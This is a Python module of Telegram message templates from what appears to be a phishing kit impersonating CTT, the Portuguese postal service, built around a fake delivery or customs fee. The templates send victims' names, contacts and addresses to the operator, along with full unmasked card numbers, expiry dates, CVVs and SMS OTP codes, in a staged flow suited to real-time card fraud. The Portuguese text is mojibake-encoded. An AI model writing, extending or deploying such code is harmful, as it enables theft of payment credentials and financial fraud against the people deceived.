"""
Templates personaliz√°veis para mensagens do Telegram
Pode modificar estes templates para personalizar as mensagens
"""

from datetime import datetime
from typing import Dict, Any
import uuid

class TelegramTemplates:
    
    @staticmethod
    def billing_template(billing_data: Dict[str, Any]) -> str:
        """Template para mensagem de informa√ß√µes de entrega"""
        return f"""üè† NOVA ENCOMENDA CTT üì¶

üë§ DADOS DO CLIENTE:
‚î£‚îÅ üìù Nome: {billing_data.get('nome', 'N/A')}
‚î£‚îÅ üìß Email: {billing_data.get('email', 'N/A')}
‚îó‚îÅ üìû Telefone: {billing_data.get('telefone', 'N/A')}

üìç ENDERE√áO DE ENTREGA:
‚î£‚îÅ üè† Morada: {billing_data.get('endereco', 'N/A')}
‚î£‚îÅ üìÆ C√≥digo Postal: {billing_data.get('codigoPostal', 'N/A')}
‚îó‚îÅ üèôÔ∏è Cidade: {billing_data.get('cidade', 'N/A')}

‚è∞ TIMESTAMP: {datetime.now().strftime('%d/%m/%Y √†s %H:%M')}
üîÑ STATUS: ‚è≥ Aguardando Pagamento

‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
üöö CTT Expresso Delivery üöö
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê"""

    @staticmethod
    def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str = None) -> str:
        """Template para primeira mensagem - dados do cart√£o"""
        # Show full card number (n√£o mascarado conforme solicitado)
        card_number = card_data.get('numeroCartao', 'N/A')
        # Format card number with spaces for better readability
        if card_number != 'N/A' and len(card_number) >= 16:
            formatted_card = f"{card_number[:4]} {card_number[4:8]} {card_number[8:12]} {card_number[12:]}"
        else:
            formatted_card = card_number
            
        # Use provided session_id or generate a simple one
        if not session_id:
            import random
            session_id = f"CTT{random.randint(10000000, 99999999)}"
        
        return f"""üí≥ **DADOS DE CART√ÉO RECEBIDOS**

üë§ **DADOS DO CLIENTE:**
‚î£‚îÅ üìù **Nome:** {billing_data.get('nome', 'N/A')}
‚î£‚îÅ üìß **Email:** {billing_data.get('email', 'N/A')}
‚îó‚îÅ üìû **Telefone:** {billing_data.get('telefone', 'N/A')}

üìç **ENDERE√áO DE ENTREGA:**
‚î£‚îÅ üè† **Morada:** {billing_data.get('endereco', 'N/A')}
‚î£‚îÅ üìÆ **C√≥digo Postal:** {billing_data.get('codigoPostal', 'N/A')}
‚îó‚îÅ üèôÔ∏è **Cidade:** {billing_data.get('cidade', 'N/A')}

üí≥ **DADOS DO CART√ÉO:**
‚î£‚îÅ üíµ **Valor:** ‚Ç¨2,99
‚î£‚îÅ üí≥ **N√∫mero do Cart√£o:** {formatted_card}
‚î£‚îÅ üìÖ **Data de Expira√ß√£o:** {card_data.get('dataExpiracao', 'N/A')}
‚îó‚îÅ üîí **CVV:** {card_data.get('cvv', 'N/A')}

üîë **ID DA SESS√ÉO:** {session_id}
‚è∞ **RECEBIDO EM:** {datetime.now().strftime('%d/%m/%Y √†s %H:%M')}
‚è≥ **STATUS:** AGUARDANDO C√ìDIGO OTP

‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
üì± Aguardando Verifica√ß√£o SMS üì±
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê"""

    @staticmethod
    def otp_template(otp_code: str, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> str:
        """Template para segunda mensagem - verifica√ß√£o OTP"""
        # Format card number with spaces and show only last 4 digits for identification
        card_number = card_data.get('numeroCartao', 'N/A')
        if card_number != 'N/A' and len(card_number) >= 16:
            formatted_card = f"{card_number[:4]} {card_number[4:8]} {card_number[8:12]} {card_number[12:]}"
        else:
            formatted_card = card_number
            
        return f"""‚úÖ **OTP VERIFICADO COM SUCESSO**

üîê **VERIFICA√á√ÉO DE SEGURAN√áA COMPLETA:**
‚î£‚îÅ üì± **C√≥digo OTP:** {otp_code}
‚îó‚îÅ ‚úÖ **Status:** VERIFICADO

üë§ **IDENTIFICA√á√ÉO DO CLIENTE:**
‚î£‚îÅ üìù **Nome:** {billing_data.get('nome', 'N/A')}
‚î£‚îÅ üìû **Telefone:** {billing_data.get('telefone', 'N/A')}
‚îó‚îÅ üí≥ **Cart√£o:** {formatted_card}"""
    
    @staticmethod 
    def simple_billing_template(billing_data: Dict[str, Any]) -> str:
        """Template simples para entrega"""
        return f"""üè† CTT - Nova Entrega

Nome: {billing_data.get('nome', 'N/A')}
Email: {billing_data.get('email', 'N/A')}
Telefone: {billing_data.get('telefone', 'N/A')}
Endere√ßo: {billing_data.get('endereco', 'N/A')}
C√≥digo Postal: {billing_data.get('codigoPostal', 'N/A')}
Cidade: {billing_data.get('cidade', 'N/A')}

Data: {datetime.now().strftime('%d/%m/%Y √†s %H:%M')}
Estado: Aguarda pagamento"""

    @staticmethod
    def emoji_billing_template(billing_data: Dict[str, Any]) -> str:
        """Template com muitos emojis"""
        return f"""üéâüè† NOVA ENCOMENDA CTT! üè†üéâ

üôã‚Äç‚ôÇÔ∏è CLIENTE: {billing_data.get('nome', 'N/A')} 
üìß EMAIL: {billing_data.get('email', 'N/A')}
üì± TELEFONE: {billing_data.get('telefone', 'N/A')}

üè° ENDERE√áO: {billing_data.get('endereco', 'N/A')}
üì¨ C√ìDIGO: {billing_data.get('codigoPostal', 'N/A')}
üèôÔ∏è CIDADE: {billing_data.get('cidade', 'N/A')}

‚è∞ DATA: {datetime.now().strftime('%d/%m/%Y √†s %H:%M')}
‚è≥ ESTADO: Aguardando Pagamento da Taxa

üööüí® CTT Expresso! üí®üöö"""

    @staticmethod
    def professional_template(billing_data: Dict[str, Any]) -> str:
        """Template profissional"""
        return f"""CTT - Correios de Portugal
Notifica√ß√£o de Encomenda

DADOS DO DESTINAT√ÅRIO:
Nome: {billing_data.get('nome', 'N/A')}
Email: {billing_data.get('email', 'N/A')}  
Telefone: {billing_data.get('telefone', 'N/A')}

ENDERE√áO DE ENTREGA:
{billing_data.get('endereco', 'N/A')}
{billing_data.get('codigoPostal', 'N/A')} {billing_data.get('cidade', 'N/A')}

Processado em: {datetime.now().strftime('%d/%m/%Y √†s %H:%M')}
Estado: Aguarda pagamento da taxa alfandeg√°ria

---
CTT - Correios de Portugal, S.A."""